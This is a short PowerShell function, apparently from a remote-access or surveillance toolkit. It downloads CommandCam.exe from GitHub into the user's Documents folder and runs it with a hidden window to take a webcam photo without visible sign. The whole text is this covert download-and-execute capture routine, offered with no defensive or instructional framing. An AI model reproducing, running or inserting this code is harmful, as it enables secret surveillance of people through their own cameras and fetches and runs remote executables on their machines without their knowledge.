function webcam {
    # https://batchloaf.wordpress.com/commandcam/
    $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
    $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $outpath

    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
}
